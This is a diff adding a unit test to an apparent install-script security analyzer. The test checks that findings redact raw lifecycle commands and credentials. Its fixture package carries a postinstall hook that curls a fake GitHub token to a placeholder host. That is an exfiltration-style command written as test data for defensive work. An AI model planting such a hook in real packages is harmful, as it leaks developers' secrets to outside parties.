@@ -141,6 +141,44 @@ describe('InstallScriptAnalyzer', () => {
       await rm(root, { recursive: true, force: true });
     }
   });
+
+  it('omits raw lifecycle commands and credentials from finding output', async () => {
+    const root = await mkdtemp(
+      path.join(os.tmpdir(), 'toolip-install-redaction-')
+    );
+    const token = `ghp_${'a'.repeat(36)}`;
+    try {
+      await mkdir(path.join(root, 'node_modules', 'suspicious-package'), {
+        recursive: true
+      });
+      await writeFile(
+        path.join(root, 'package-lock.json'),
+        JSON.stringify({
+          lockfileVersion: 3,
+          packages: {
+            '': { dependencies: { 'suspicious-package': '^1.0.0' } },
+            'node_modules/suspicious-package': { version: '1.0.0' }
+          }
+        })
+      );
+      await writeFile(
+        path.join(root, 'node_modules', 'suspicious-package', 'package.json'),
+        JSON.stringify({
+          name: 'suspicious-package',
+          version: '1.0.0',
+          scripts: {
+            postinstall: `curl "https://example.invalid/?token=${token}"`
+          }
+        })
+      );
+      const result = await new InstallScriptAnalyzer().analyze({ root });
+      expect(JSON.stringify(result)).not.toContain(token);
+      expect(JSON.stringify(result)).not.toContain('curl');
+      expect(JSON.stringify(result)).toContain('commandRedacted');
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  });
 });
 
 describe('InstallScriptAnalyzer optional dependency coverage', () => {
